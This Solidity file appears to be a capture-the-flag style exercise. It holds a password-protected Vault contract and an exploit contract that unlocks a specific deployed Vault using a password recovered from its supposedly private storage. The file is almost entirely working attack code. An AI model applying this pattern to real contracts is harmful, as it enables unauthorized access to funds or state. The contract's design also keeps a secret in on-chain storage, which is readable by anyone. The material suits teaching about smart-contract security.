// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}

contract exploit {
    bytes32 pass = hex"412076657279207374726f6e67207365637265742070617373776f7264203a29";
    Vault target = Vault(0x21FBbB1797F0ebE046ac6Da6b9F3950E55F84cdD);
    constructor() {
        target.unlock(pass);
        require(target.locked() == false, "fail");
    }
}